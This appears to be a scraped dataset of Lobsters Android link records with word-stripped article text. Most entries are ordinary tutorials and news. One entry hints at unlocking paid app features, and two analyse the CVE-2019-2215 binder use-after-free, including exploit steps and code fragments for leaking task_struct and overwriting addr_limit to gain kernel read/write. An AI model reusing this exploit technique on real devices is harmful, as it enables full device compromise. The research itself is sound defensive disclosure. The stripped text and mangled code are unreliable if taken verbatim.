70,Lobsters,android,Android,Manage Contacts the UNIX Way,https://vermaden.wordpress.com/2019/12/13/manage-contacts-the-unix-way/,manage contact unix way,export phone cat exportvcf contactsconvertvcffromsh exportvcf column contact cat contact grep v butcher contact contactsnobutcher contactsconvertvcftosh contactsnobutcher importvcf cat importvcf script contactsconvertvcffromsh contactsconvertvcffromsh c exportvcf contactsconvertvcftosh contactschecksh contact column http githubcomvermadenscripts wget http rawgithubusercontentcomvermadenscriptsmastercontactschecksh wget http rawgithubusercontentcomvermadenscriptsmastercontactsconvertvcffromsh wget http rawgithubusercontentcomvermadenscriptsmastercontactsconvertvcftosh chmod x contact updating contact diff u contact contactsnew egrep vim contact contactsnew like,two year ago neighbor asked question manage contact device aha moment topic problem iphone itunes android phone wanted manage contact one single sensible place finally settled closed source freeware software run window answer beginning manage contact unix open source way tried search open source software capable efficiently without much effort pita failed miserably usual came set script job several year using system quite satisfied result pita reduced minimum export phone vcf file also called vcard exported mobile android based phone look like cat exportvcf begin vcard n pierre herbert hugues fn herbert pierre hugues tel note executive email pierre gmailcom end vcard begin vcard n local butcher fn butcher local tel tel tel note cheap end vcard begin vcard n martin brundle fn martin brundle tel tel xqq home note fast end vcard used color distinguish different contact annoying field seems n try smarter needed trying really hard first put surname name name fn field lot useful remaining field tel email try outsmart u work desired vcard course start begin vcard end end vcard obvious initially wrote script instant messaging still used several year fast forward use rarely still use keep instant messaging numberaccount information vcard xqq field use protocol number notation use different instant messaging solution gg example polish solution called gadugadu find vcard format readable grepablesearchable thus convert plain text file look like follows grep awk friendly column separated space name phone im mail note vcard information look converting script plain text column contactsconvertvcffromsh exportvcf column contact cat contact name phone im mail note butcher local cheap herbertpierrehugues pierre gmailcom executive martinbrundle fast length underscore definedhardcoded script hardcode comparison purpose later entry also sorted name could embedrework script contain also column command saw need course possible let suppose want generate new vcard contact could use grep filter unneeded entry like grep v butcher contact contactsnobutcher contactsconvertvcftosh contactsnobutcher importvcf cat importvcf begin vcard fn herbert pierre hugues tel email pierre gmailcom note executive end vcard begin vcard fn martin brundle tel xqq note fast end vcard obvious generated vcard contain butcher local contact send importvcf file phone using email import contact would vcard shared script use three script convertexportimportcheck data vcard form contactsconvertvcffromsh script name suggests convert vcard data vcf file plain text information also implemented csv method may useful people put data spreadsheet contactsconvertvcffromsh usage contactsconvertvcffromsh type file type c csv p plain text example csv output script contactsconvertvcffromsh c exportvcf name phone im mail note butcher local cheap pierre gmailcom executive martinbrundle fast contactsconvertvcftosh script convert plain text data vcard format contactsconvertvcftosh usage contactsconvertvcftosh file last contactschecksh script used find duplicated phone information within plain text file many time found duplicated contact different name phone number contactschecksh contact column butcher local cheap martinbrundle fast three available github script page http githubcomvermadenscripts available course download using command line like wget http rawgithubusercontentcomvermadenscriptsmastercontactschecksh wget http rawgithubusercontentcomvermadenscriptsmastercontactsconvertvcffromsh wget http rawgithubusercontentcomvermadenscriptsmastercontactsconvertvcftosh chmod x contact updating contact easy maintain several contact matter format grow contact need deal intelligently mention add new contact phone often also update local plain text contact file unix come handy may use diff compare update following command diff u contact contactsnew egrep contact contactsnew johndoethethird joghdoe gmailcom jankowalski slow way know two new contact one local contact file one plain text version generated phone exported vcf file called contactsnew also use vim diff mode enabled starting flag shown vim contact contactsnew look like get back amount used column plain text file keep amount time diff possible would put column command would generate larger name column example longer contact name additional space remaining contact diff vim tool show contact new manage contact unix way fun way dealing contact please let know eof like like loading related
71,Lobsters,android,Android,Xmake Getting Started Tutorial 5: Introduction to Android platform compilation,https://tboox.org/2019/11/15/quickstart-5-build-android/,xmake getting started tutorial introduction android platform compilation,ready work android ndk ndk integration compilation manually configure ndk global configuration ndk path automatic detection ndk path c stl library configuration switch api version setting switch compilation architecture faq compiled executable run device,xmake lightweight modern cc project building tool based lua main feature easy use syntax easy use project maintenance consistent build experience across platform article mainly explains detail compile library executable program run android xmake ready work first need prepare ndk toolchain necessary compiling android native library download decompress official websit android ndk want get better backward compatibility choose version last version support armeabi special requirement download latest version directly ndk integration compilation manually configure ndk need pas decompressed ndk directory path xmake complete configuration compile directly example xmake f p android xmake among p android used switch android platform specify platform target program current host platform compiled default generally special requirement configuration complete compilation android native program currently xmake builtin support generation three type target file binary static shared correspond executable program static library dynamic library global configuration ndk path xmake fconfig command configuration current project often need set ndk path crossplatform compilation configuration switching still little tedious set xmake gglobal global configuration command ensure take effect permanently xmake g also ensure permanent effect setting androidndkhome global environment variable similar effect command configuration automatic detection ndk path generally even ndk path configured xmake still try detect common path default example macos automatically detect whether following path exist libraryandroidsdkndkbundle sdk directory automatically created android studio downloading mac common place ndk try probe environment variable androidndkhome exists detected need configure manually c stl library configuration switch first let introduce three stl library version provided ndk stlport stl library built early ndk basically obsolete gnustl stl library mainly used ndk since also removed google llvmc newer ndk builtin stl library therefore compile android library need choose stl choose appropriate ndk version according need xmake usually us llvmc library default possible find current ndk version older try degrade go gnustl user also manually modify version stl library example xmake f p android ndkxxxx ndkcxxstlgnustlshared specifically configuration value ndkcxxstl option type help view xmake f help mainly llvmstlstatic llvmstlshared gnustlstatic gnustlshared stlportstatic stlportshared api version setting compilation process libc library symbol found usually possible api version set correctly libc function exist higher version apis time solve trying manually modify api version xmake f p android ndkxxx switch compilation architecture present xmake provides configuration architecture mips arch specified used default architecture manually modify arch follows xmake f p android ndkxxx project need configure compilation setting unique android platform adding specific macro switch link library etc use isplat android determine processing xmakelua target test setkind shared addfiles src c isplat android adddefines android addsyslinks log end faq try modify stl library version api version solve example ndk recommends using gnustl library version llvmc library integrated shortly many problem easy encounter various compilation problem use xmake f p android ndkxxxx ndkcxxstlgnustlshared compiled executable run device usually api version set high causing incompatibility issue try reduce api version
72,Lobsters,android,Android,Fake Android apps uploaded to Play store by notorious Sandworm hackers,https://nakedsecurity.sophos.com/2019/12/02/fake-android-apps-uploaded-to-play-store-by-notorious-sandworm-hackers/,fake android apps uploaded play store notorious sandworm hacker,,sophos home protects every mac pc home
73,Lobsters,android,Android,How to Debug a Third Party Android App,https://camg.me/debug-third-party-android-apps/,debug third party android app,work enabling debugging way work add android androidmanifestxml stack exchange apktool handle resource longer supported root phone set magiskhide prop config configuration file lineageos opengapps archived link tldr install lineageos,recently spent small amount time learning debug third party android application many method listed online work today explain work explain one way skip work interested first let get may useful dynamic analysis see live code flow difficult determine static analysis especially obfuscated code read data available including checksum user information find code may want patch enabling debugging way work method debugging android application found work longer work work case add android androidmanifestxml stack exchange several blog recommend method usually step something like use apktool decompile application resource add android debuggable true androidmanifestxml recompile resign repackage apk reason work apktool handle resource properly apk decompiled resource probably see brutexception try build app reversing really simple resource may run feeling bit common day used able pas apktool debug flag could automatically add debug flag manifest apktool debug testapk longer supported apktool root phone set magisk module called magiskhide prop config claim allow set rodebuggable usually readonly setting android phone hence ro installed supposed able modify property like android terminal device typing prop following instruction tried many variation including suggestion use configuration file also get one working others may luck fluke old nexus work much researching realized going need figure set device old jira issue lineageos found custom rom come rodebuggable set default many guide installing lineageos different device get call though probably need install opengapps first boot lineage app reversing us google service device great guide debug smali code android studio archived link tldr install lineageos hope helpful upcoming post explain used debugging get access pro feature free
74,Lobsters,android,Android,Bad Binder: Android In-The-Wild Exploit,https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html,bad binder android inthewild exploit,,posted maddie stone project zero introduction october disclosed issue useafterfree binder android kernel bug local privilege escalation vulnerability allows full compromise vulnerable device chained browser renderer exploit bug could fully compromise device malicious website reported bug disclosure deadline rather normal disclosure deadline made decision based credible evidence exploit vulnerability exists wild highly likely exploit actively used user may project zero published blog post spreadsheet tracking inthewild exploit july joined project zero focus use exploit wild expect approach work change mature gain experience studying mission stay make zeroday hard far key approach started hunt bug based rumorsleads currently use use bug hunting expertise find patch bug rendering exploit benign perform variant analysis used wild looking bug often find one similar type time however exploit usually us one instance possible pattern variant find resolve similar variant bug effort involved creating new exploit higher complete detailed analysis point view bug hunter exploit developer share back community transparency collaboration key want share detailed root cause analysis inform developer defender prevent type bug future improve detection hope publishing detail exploit methodology inform threat intelligence incident responder overall want make information often kept silo accessible starting point thinking tactical work around exploit used wild make much progress try alone whether vendor defender researcher journalist threat analyst policy specialist victim advocate someone else role play make hard exploit wild please feel free reach explore may able work together rest post drive conversation forward sharing one instance work blog post explain bug methodology finding proofofconcept exploit released work evidence commentary use bug inthewild exploitation hunting bug late summer google threat analysis group tag android security project zero team received information suggesting nso exploit android part attack chain installed pegasus spyware target device received detail marketed capability detail included fact bug exploit methodology including kernel privilege escalation using useafterfree vulnerability reachable inside chrome sandbox work pixel pixel patched linux kernel without cve configdebuglist break primitive hinders exploitation vulnerability exploitable chrome renderer process android isolatedapp selinux domain exploit requires little perdevice customization list affected unaffected device version nonexhaustive list available description issue fact gave u important information scope potential bug looking know useafterfree kernel diff pixel pixel kernel looking change pixel based linux kernel include vulnerability fix linux kernel extremely helpful tip kernel two action three function whose behavior change based configdebuglist flag adding listadd deleting listdelentry listdel doubly linked list therefore could infer freed obj linked list add delete performed free occurs likely mean exploit using memory corruption overwrite address limit stored near start taskstruct would normally stored bottom stack linux android backported change moved taskstruct protect stack overflow older kernel assume bug exploitation methodology common kernel rather code often customized like framework whenever candidate bug seemed fit requirement vetted list affected unaffected device based detail began combing changelogs patch looking potential bug finding actually occured second attempt originally thought potential bug different issue ruled based information week first attempt tracking bug others recommended look binder looking back detail state vulnerability exploitable chrome renderer process android isolatedapp selinux domain caused look binder driver first diffed pixel pixel driversandroidbinderc file changelogs significant change commit stood log discus fixing useafterfree commit message patch upstream upstream patch applied began evaluate bug requirement bug lead found matched perfectly also looked every change binder pixel pixel change matched every detail wrote proofofconcept demonstrates bug exploited original discovery bug bug originally found reported november patched february syzbot syzkaller system continuously fuzz linux kernel originally reported useafterfree bug linux kernel mailing list syzkallerbugs mailing list november report bug patched linux android android android kernel february however fix never included android monthly security bulletin thus bug never patched many already released device pixel pixel android provided following statement original discovery bug android informed security implication bug project zero september android partner notified bug provided update address within hour android also assigned explicitly indicate represents security vulnerability original report syzkaller corresponding linux patch highlight security implication pixel already protected issue update affected pixel device available user early october technical detail bug bug useafterfree uaf binder driver binderthread struct defined driversandroidbinderc member wait waitqueueheadt struct type wait still referenced pointer epoll even binderthread struct containing freed struct binderthread struct binderproc proc struct rbnode rbnode struct listhead waitingthreadnode int pid int looper modified thread bool looperneedreturn written thread struct bindertransaction transactionstack struct listhead todo bool processtodo struct bindererror returnerror struct bindererror replyerror waitqueueheadt wait struct binderstats stats atomict tmpref bool isdead struct taskstruct task struct waitqueuehead spinlockt lock struct listhead tasklist typedef struct waitqueuehead waitqueueheadt binderthreadexit ioctl call binderthreadrelease function free binderthread struct however epoll called thread binderpoll tell epoll use wait wait queue embedded binderthread struct therefore binderthread struct freed epoll pointing freed wait queue normally wait queue used polling file guaranteed alive file release handler called rare case require use pollfree contrast binder driver worked constantly removed readded epoll watch underlying bug useafterfree symptom look stack trace kasan original report see useafterfree removewaitqueue kernelschedwaitc source code removewaitqueue removewaitqueue function q pointer freed waitqueueheadt binderthread struct wait entry wait queue whose head freed useafterfree triggered kasan crash call spinlockirqsave argument q lock q pointing freed memory however removewaitqueue call interesting exploitation shown removewaitqueue simply call listdel tasklist wait queue giving u unlinking primitive void removewaitqueue waitqueueheadt q waitqueuet wait unsigned long flag spinlockirqsave q lock flag removewaitqueue q wait spinunlockirqrestore q lock flag removewaitqueue waitqueueheadt head waitqueuet old listdel old tasklist bug triggered following code also original report syzkaller include fcntlh include sysepollh include sysioctlh include unistdh define binderthreadexit int main int fd epfd struct epollevent event event epollin fd open devbinder ordonly epfd epollcreate epollctl epfd epollctladd fd event ioctl fd binderthreadexit null verified pixel running android spl september still included bug kasan output included issue tracker exploiting useafterfree confirming bug reporting android began working fellow team member jann horn write proofofconcept poc exploit poc published issue tracker comment used uaf described gain arbitrary kernel read write unprivileged application context section explain poc exploit wrote work section describes decided exploit bug necessarily inthewild exploit work exploit trigger uaf twice order overwrite address limit obtain arbitrary kernel read write privilege first use uaf leak address taskstruct contains process address limit addrlimit second use uaf overwrites value addrlimit addrlimit value defines address range may accessed dereferencing userspace pointer usercopy operation access address addrlimit therefore raising addrlimit overwriting make kernel memory accessible unprivileged process trigger uaf use vectored scattergather io somewhat similar way dishen presented talk code blue art exploiting unconventional useafterfree bug android kernel video triggering uaf exploit uaf bug reallocate freed binderthread memory io vector use unlinking primitive gain scoped kernel read leak taskstruct address trigger uaf scoped kernel write overwrite addrlimit section describes use uaf initial read write vectored io vectored io also known scattergather io vectored read move data data source file set disparate buffer scatter moving onto next buffer filled vectored write move data set buffer data sink file gather readv writev syscalls performing vectored io definition fsreadwritec readv unsigned long fd const struct iovec user vec unsigned long vlen writev unsigned long fd const struct iovec user vec unsigned long vlen vec argument array iovec structs iovec struct describes buffer iovec struct definition includeuapilinuxuioh struct iovec void user iovbase kernelsizet iovlen use writev leak address taskstruct first time trigger uaf addition readv writev recvmsg syscall receiving message socket also us vectored io msghdr second argument recvmsg member named msgiov point array iovec structs use recvmsg second time trigger uaf overwrite addrlimit using vectored io uaf write read use vectored io gain uaf read leaking taskstruct address uaf write overwriting addrlimit taskstruct vectored io operation like readv writev recvmsg import userspace io vector array kernel space verify vector element userspace call rwcopycheckuvector rwcopycheckuvector return successfully iovec array kernel space another verification pointer value iovbase field mean io blocking overwrite buffer pointer iovec array using uaf readwrite read write place kernel memory iovec struct size byte binderthread struct byte therefore create array iovec structs order make iovec array similar size freed struct kernel allocates memory based size allocation control struct almost size freed memory good chance controlled struct allocated place iovec array byte smaller binderthread order overwrite taskstruct pointer value end binderthread struct still close enough allocated slab thus position kernel memory freed binderthread struct iovec array allocated memory freed binderthread struct struct member line binderthread struct iovec array iovec iovbase iovec iovlen waitlock iovec iovbase waittasklistnext iovec iovlen waittasklistprev iovec iovbase vectored io copied iovec structs kernel memory want io operation block epremovewaitqueue run separate thread epremovewaitqueue run perform listdel operation value offset diagram since epremovewaitqueue still belief memory value part waitqueueheadt struct epremovewaitqueue call removewaitqueue call removewaitqueue call listdel static inline void listdel struct listhead prev struct listhead next next prev prev writeonce prev next next ifndef configdebuglist static inline void listdel struct listhead entry listdel entry prev entry next entry next entry prev uaf exploitation technique described blog post successful configdebuglist enabled listdel implemented differently enabled implementation configdebuglist enabled shown debug implementation shown found liblistdebugc debug version listdel call listdelentry includes check ensure prev next entry next prev entry check fail bugon called process die android device usually set entire device reboot check prevents exploitation method working configdebuglist enabled void listdelentry struct listhead entry struct listhead prev next prev entry prev next entry next warn next listdel corruption p next p n entry warn prev listdel corruption p prev p n entry warn prev next entry listdel corruption prev next p pn entry prev next warn next prev entry listdel corruption next prev p pn entry next prev bugon paniccorruption return listdel prev next exportsymbol listdelentry listdel deletes entry list entry element delete list note listempty entry return true entry undefined state void listdel struct listhead entry listdelentry entry entry next entry prev entry passed listdel entry wait queue list freed waitqueueheadt struct contains list head entry member prior listdel operation list look like diagram listdel operation look like diagram list head prev next pointer set point list head mean iovbase overwritten kernel address perform scoped read write operation kernel space beginning list head leaking taskstruct pointer follow process outlined use useafterfree leak task structure pointer linux kernel thus android kernel taskstruct includes important information process case want get pointer taskstruct includes process address limit code leak taskstruct pointer function leaktaskstruct poc function start adding binder file descriptor fd epoll interest list create array iovec structs next set value iovec entry first entry set iovbase iovlen kernel skip processing vector iovec iovbase set value look like unlocked spinlock iovec iovlen set size pipe pipe block moving content iovec iovbase pipe unblocks begin iovec binderthread struct iovec array iovec iovbase iovec iovlen waitlock iovec iovbase waittasklistnext iovec iovlen waittasklistprev iovec iovbase iovec iovlen set iovec iovbase need lowerhalf address value pas spinlock removewaitqueue need spinlockirqsave run successfully removewaitqueue called successful call removewaitqueue within epollctldel execution must occur iovec array copied kernel memory rwcopycheckuvector called writev iovec processed since length clobbered uaf write writev begin reading address iovec iovbase therefore need writev call block prior trying write iovec content pipe fill whole pipe content care completely fill pipe writev block something begin read pipe therefore set iovec iovbase address buffer filler content set length size pipe size writev put dummy content pipe block giving u time change address iovec iovbase unlinking primitive removewaitqueue removewaitqueue finish read dummy content pipe unblocking write nowunblocked writev begin reading address iovec iovbase changed list head address binderthread kernel writev finish read end pipe value offset taskstruct pointer wait queue list head binderthread struct taskstruct pointer overwriting address limit saved taskstruct pointer trigger uaf order overwrite address limit taskstruct time using recvmsg instead writev process listdel iovbase end pointing listhead waitqueue point though instead reading address begin write value unsigned long secondwritechunk iovlen already used iovbase already used iovlen already used currentptr next iovbase addrlimit next iovlen sizeof addrlimit value write new addrlimit understand overwrites addrlimit need remember scatter io work read unix domain socket disparate buffer filling one moving next listdel scatter io begin buffer iovec iovbase value iovec iovbase point list head wait queue listdel operation first value going overwrite iovec structs originally set iovec iovlen mean write byte moving buffer stored iovec iovbase want overwrite iovec iovbase address addrlimit overwrite address limit without overwrite everything list head address limit set length iovec buffer byte byte iovec iovlen iovec iovbase iovec iovlen iovec iovbase iovec ioveclen move write newlyoverwritten address iovec iovbase writes one le kernelds bypass segmenteq getfs kernelds branch ioviterinit addrlimit making memory including kernel memory accessible part userspace memory range process thus granting arbitrary kernel read write value listdel operation prior recvmsg value recvmsg iovec iovlen point list head iovec iovlen iovec iovbase point previous element iovec iovbase iovec iovlen iovec iovlen iovec iovbase iovec iovbase taskstruct iovec iovlen iovec iovlen taskstruct addrlimit inthewild analysis stated introduction deemed enough credible evidence used wild support disclosure deadline credible evidence included lead detail outlined hunting bug section detailed review kernel patch requirement perfectly aligned one bug one bug examined information included marketing material exploit exploit used install version pegasus evidence decided although exploit sample risk user great wait day patch disclosure thus reported android deadline deadline exists day actively exploited vulnerability remains undisclosed public unpatched device account compromised therefore decided vulnerability required disclosure public soon possible variant analysis think important variant take away bug bug often patch upstream linux andor android kernel flagged security bug though security impact included android security bulletin thus get patched released device sorting linux patch huge undertaking instead one approach address issue could addressed regularly syncing upstream stable kernel addition also looked variant poll handler us wait queue tied lifetime file issue similar significance discovered far conclusion permit attacker fully compromise device untrusted app access browser renderer exploit despite patch available upstream linux kernel left unpatched android device almost year time believe attacker able use vulnerability exploit user wild given information various public document service nso group provides seems likely vulnerability chained either browser renderer exploit remote capability kernel vulnerability android especially dangerous largely across different device whereas component device framework soc preinstalled apps often customized one device another across different manufacture single kernel vulnerability majority android device manufactured prior september vulnerable patch gapping lts linux kernel android common kernel kernel running endusers device leaf ripe surface area exploitation prevent issue like android could force device sync upstream linux android common kernel regular cadence publicly disclosed october reporting android due credible evidence inthewild exploitation made determination based document marketing detailing android exploit capability view often reasonable infer vulnerability exploited inthewild form contextual information marketing material seen case combined deep analysis patch binarysample always required therefore day waited disclose meant another day atrisk user exposed harm october android added update october android security bulletin addressed issue device showing security patch level oct patched bug highlight order make zeroday hard need work learn much used wild share back community work together make kind exploitation much harder please reach let collaborate tl dr lead even without sample help u find bug get security vulnerability patched patch gap released device kernel leaf ripe area exploitation kernel key layer android security model project zero ramping inthewild analysis work open collaboration please reach
75,Lobsters,android,Android,Analyzing Android's CVE-2019-2215 (/dev/binder UAF),https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/,analyzing android devbinder uaf,basic overview binder vectored io binder vectored io vulnerability detail free use free leaking kernel task struct weaponizing unlink triggering leak establishing arbitrary readwrite arbitrary rw primitive breaking limit getting controlled write primitive arbitrary readwrite helper function additional note conclusion reference additional resource issue android useafterfree binder driver chromium bug tracker project zero exploit syzkaller kasan report bootlin linux kernel source browser credit,past week frequent day stream twitch may seen working trying understand recent android binder useafterfree uaf published google project zero bug actually new issue discovered fixed mainline kernel february however discovered many popular device receive patch downstream device include pixel huawei samsung galaxy phone believe many device received security patch within last couple week finally killed bugafter stream poking around kernel debugger virtual machine running testing vulnerable pixel came understand exploit written jann horn maddie stone pretty well without understanding binder binderthread object specifically well vectored io work exploit pretty confusing also quite clever exploited issue thought would cool write exploit workswe mostly focusing arbitrary readwrite primitive established wo nt focus postexploit stuff disabling selinux enabling full root capability quite writeups already cover brief overview article cover basic overview binder vectored iovulnerability detailsleaking kernel task structestablishing arbitrary readwrite arbitrary rw primitiveconclusionnote code snippet kernel kernel tested personallybasic overview binder vectored iobinderthe binder driver androidonly driver provides easy method inter process communication ipc including remote procedure calling rpc find driver source code mainline linux kernel however configured nonandroid buildsthere different binder device driver used different type ipc communication framework app process using android interface definition language aidl devbinder used communication framework vendor process hardware using hardware abstraction layer hal interface definition language hidl devhwbinder used finally vendor want use ipc vendor process without using hidl devvndbinder used purpose exploit care first driver devbinderlike ipc mechanism linux binder work file descriptor add event poll using epoll apivectored iovectored io allows either write data stream using multiple buffer read data stream multiple buffer also known scattergather io vectored io offer advantage nonvectored io one write read different buffer noncontiguous without bunch overhead also atomican example vectored io useful data packet header followed data contiguous block using vectored io keep header data separate noncontiguous buffer read write using one system call instead twohow work define array iovec structure contain information buffer like use io iovec structure relatively small consisting two qwords byte data systemsstruct iovec size void iovbase sizet iovlen vulnerability detailsthe binder driver cleanup routine trigger ioctl actually closing driver familiar driver cleanup routine likely already guess cause issueslet look report summary described upstream commit binderpoll pass thread wait waitqueue slept work thread us epoll explicitly exit using binderthreadexit waitqueue freed never removed corresponding epoll data structure process subsequently exit epoll cleanup code try access waitlist result useafterfree summary bit misleading useafterfree waitqueue waitqueue inline struct binderthread structure binderthread object actually uaf reason mention waitqueue directly commit summary issue originally found google syzkaller fuzzer back fuzzer triggered useafterfree detected kernel address sanitizer kasan waitqueue mutexthe freelet take look ioctl command question binderthreadexitstatic long binderioctl struct file filp unsigned int cmd unsigned long arg switch cmd case binderthreadexit binderdebug binderdebugthreads exitn proc pid thread pid binderfreethread proc thread thread null break static int binderfreethread struct binderproc proc struct binderthread thread struct bindertransaction struct bindertransaction sendreply null int activetransactions activetransactions sendreply bindersendfailedreply sendreply brdeadreply binderreleasework thread todo kfree thread binderstatsdeleted binderstatthread return activetransactions critical line code line kfree thread free part useafterfree happensthe use free seen free happens let try see use happens stack trace kasan report helpful thiscall trace epremovewaitqueue inline first bit confusing binderthread object referenced indirectly ie ctrl f binderthread wo nt find occurrence however quickly look epunregisterpollwait static void epunregisterpollwait struct eventpoll ep struct epitem epi struct listhead lsthead epi pwqlist struct eppollentry pwq listempty lsthead pwq listfirstentry lsthead struct eppollentry llink listdel pwq llink epremovewaitqueue pwq kmemcachefree pwqcache pwq notice free binderthread epollentry linked list eventually pwq isstatic void epremovewaitqueue struct eppollentry pwq waitqueueheadt whead rcureadlock cleared pollfree rcusafe read null need barrier paired smpstorerelease eppollcallback otherwise rely whead lock whead smploadacquire pwq whead whead removewaitqueue whead pwq wait rcureadunlock see pwq used two place one head linked list wait queue whead wait queue object deleted via removewaitqueueat first glance seems argument removewaitqueue relatively close memory smploadacquire macro need considered macro memory barrier initially assumed macro added compiler stuff atomic access whead mistake entirely obvious smploadacquire macro dereferences passed originally read whead pwq whead actually like whead waitqueueheadt pwq whead simply whead pwq wheadlet look removewaitqueue writeup comment q point stale data uaf object void removewaitqueue waitqueueheadt q waitqueuet wait unsigned long flag spinlockirqsave q lock flag removewaitqueue q wait spinunlockirqrestore q lock flag head linked list end uaf binderthread q point stale data kasan crash occurs spinlock attempt lock mutex q free memoryon normal device using kasan instrumentation run proofofconcept poc asis likely wo nt notice anything highly likely crash occur may lead incorrectly assume device vulnerable likely q still point valid stale heap data however perform heap spray trigger cpu stall cause device freezethis lock essentially integer set either unlocked locked technically mutex set value zero considered locked attackercontrolled heap spray essentially lock mutex without going proper channel mutex permanently locked cause deadlock freeze deviceit worth noting object resides cache pretty decent cache exploitation used lot background process compared smaller cache kernel object byte size size far fair assumption object end cache devicesleaking kernel task structweaponizing unlinkthe way vulnerability exploited quite clever exploit take advantage linked list unlink operation used overlapped object corrupt using linked list metadataassuming spinlock nt deadlock invalid mutex due memory corruption eventually next epremovewaitqueue pwq wait reference point uaf object consider removewaitqueue inevitably removewaitqueue structure writeup comment old point stale data uaf object static inline void removewaitqueue waitqueueheadt head waitqueuet old listdel old tasklist static inline void listdel struct listhead entry listdel entry prev entry next entry next entry prev static inline void listdel struct listhead prev struct listhead next next prev prev writeonce prev next next main line importance next prev prev essentially unlink writes uaf object pointer previous objectthis useful overlap another kernel object top uaf object weaponize unlink corrupt data overlapped object used leak kernel data object good candidate attack strategy enter iovecthere property theiovec structure make really good candidate exploitation herethey small size machine control field restrictionsyou stack thus control kmalloc cache iovec stack end many write withthey pointer iovbase perfect field corrupt unlinkunder normal circumstance iovbase checked kernel anywhere used kernel first ensure iovbase userland pointer processing request however using unlink primitive talked corrupt pointer postvalidation overwrite kernel pointer prev object unlink processthis mean read descriptor written corrupted iovec reading data originating kernel pointer userland one like intended allow u leak kernel data relative prev pointer contains pointer useful enough allow arbitrary readwrite well code executionthe tricky step process figuring iovec index line waitqueue important nt fake mutex properly device hang wo nt able fun itfinding offset waitqueue fairly easy kernel image version targeting looking function us waitqueue field binderthread easily find offset disassembly one function binderwakeupthreadilocked call wakeupinterruptiblesync thread wait offset referenced address loaded register call add mov mov tbz bl wakeupsync kernel see wait queue byte binderthread object since iovec size mean iovec index array line wait queue define binderthreadsz define iovecarraysz binderthreadsz define waitqueueoffset define iovecindxforwq waitqueueoffset one pas valid iovbase address pas validation also keeping lock prevent deadlock since lock dword byte pointer passed need use mmap map userland address lower mmap void pagesize protread protwrite mapprivate mapanonymous struct iovec iovecarray iovecarraysz memset iovecarray sizeof iovecarray iovecarray iovecindxforwq iovbase spinlock low address half must zero iovecarray iovecindxforwq iovlen wq tasklist next iovecarray iovecindxforwq iovbase void wq tasklist prev iovecarray iovecindxforwq iovlen exploit run iovec iovecindxforwq take place mutex well next pointer linked list iovec iovecindxforwq take place prev pointer linked list mean iovecindxforwq iovbase field one overwritten kernel pointerlet take look free memory kgdb vm running unlink operation set breakpoint call removewaitqueue first argument point free memory find pointer rdi register examine memory call see following thread hit breakpoint epunregisterpollwaitisra gdbpeda rdi notice data overlap iovec structure example see let take look memory unlink occurs set breakpoint end epunregisterpollwait examine memorythread hit breakpoint epunregisterpollwaitisra gdbpeda iovlen iovec iovecindxforwq overwritten kernel pointer iovbase iovec iovecindxforwq overwritten kernel pointer thus corrupting iovec internal backing structure kernel heap triggering leakit seems decided go pipe medium leak attack strategy basically follows create pipetrigger free binderthread object iovec structure allocated next step overlap itwrite iovec structure binderthread old memory via writev system call pipetrigger useafterfree unlink corrupt iovec structurecall read pipe use uncorrupted iovec iovecindxforwq read dummypage datacall read pipe use corrupted iovec iovecindxforwq read kernel data leak bufferbecause initialized two iovec iovlen ultimately writev call write two page data first page contain data dummypage nt useful exploitation second page contain kernel data easier handle read writes two separate thread parent thread responsible triggering free binderthreadwriting iovec stack pipe connected child process overlap free binderthread wait child thread reading second page leaked kernel datathe child thread responsible corrupting iovec triggering unlink via deletion epoll eventreading first page dummy datawhen put together leak code note functionally similar except cleaned bit ported app hence androidlogprint struct epollevent event event epollin struct iovec iovecarray iovecarraysz char leakbuff int pipefd int bytesent pidt pid memset iovecarray sizeof iovecarray epollctl epfd epollctladd fd event exitwitherror epollctladd failed strerror errno iovecarray iovecindxforwq iovbase dummypage mutex iovecarray iovecindxforwq iovlen linked list next iovecarray iovecindxforwq iovbase void linked list prev iovecarray iovecindxforwq iovlen pipe pipefd exitwitherror pipe failed strerror errno fcntl pipefd fsetpipesz exitwitherror fsetpipesz failed strerror errno pid fork pid prctl prsetpdeathsig sigkill sleep epollctl epfd epollctldel fd event read pipefd leakbuff sizeof leakbuff sizeof leakbuff exitwitherror child read failed strerror errno close pipefd exit ioctl fd binderthreadexit null bytesent writev pipefd iovecarray iovecarraysz bytesent exitwitherror parent leak failed writev returned expected bytesent read pipefd leakbuff sizeof leakbuff sizeof leakbuff exitwitherror parent read failed strerror errno androidlogprint androidloginfo exploit leak lxn leakbuff threadinfo unsigned long leakbuff run app get something similar following logcat comexamplebinderuaf iexploit leak pointer point current process threadinfo struct structure useful field leverage get arbitrary readwrite primitiveestablishing arbitrary readwrite arbitrary rw primitivebreaking limitsso leaked useful kernel pointer let take look first member taskinfo object leaking address ofstruct threadinfo unsigned long flag low level flag mmsegmentt addrlimit address limit struct taskstruct task main task structure int preemptcount preemptable bug int cpu cpu field interest addrlimit important macro reference field term security let look one accessok define accessok type addr size rangeok addr size comment rangeok essentially equivalent addr size current addrlimit macro used pretty much everywhere kernel try access userprovided pointer used ensure pointer provided really userland pointer prevents people trying clever passing kernel pointer kernel expects userland pointer see going addrlimit smashed freely pas kernel pointer userland pointer expected accessok never failgetting controlled write primitivewe already demonstrated use unlink read leak kernel data modify turn leak kernel data wrote noncontiguously file descriptor stack iovec structure corrupted one unlink read call later would leak datato corrupt kernel data go way calling recvmsg stack iovec structure corrupting way force data wrote using write copied sequential iovec structure get arbitrary writelet look iovec stack slot uaf object recvmsg iovecarray iovecindxforwq iovbase dummypage mutex iovecarray iovecindxforwq iovlen linked list next iovecarray iovecindxforwq iovbase void linked list prev iovecarray iovecindxforwq iovlen iovlen previous element next element iovecarray iovecindxforwq iovbase void iovecarray iovecindxforwq iovlen similar infoleak case unlink corrupts iovecindxforwq ioveciovlen iovecindexforwq ioveciovbase kernel pointer pointing directly iovecindxforwq ioveciovlen however time splitting data written using iovec structuresjust like infoleak case unlink corrupts iovlen iovec iovecindxforwq iovbase iovec iovecindxforwq kernel pointer kernel pointer nt pointing random data somewhere take look kgdb output notice point iovlen iovec iovecindxforwq recvmsg reach iovec start copying data wrote write pointer allows u write arbitrary data following iovec structs postvalidation allows u pas pointer want iovbase next iovec giving u arbitrary write control get written address tailing qword write look data get written indeed see aligns backing data iovlen iovecindxforwq onwardsunsigned long secondwritechunk iovlen iovbase already used iovlen already used currentptr next iovbase addrlimit next iovlen sizeof addrlimit value write attack strategy follows create socketpairtrigger free binderthread object recvmsg iovec stack overlap 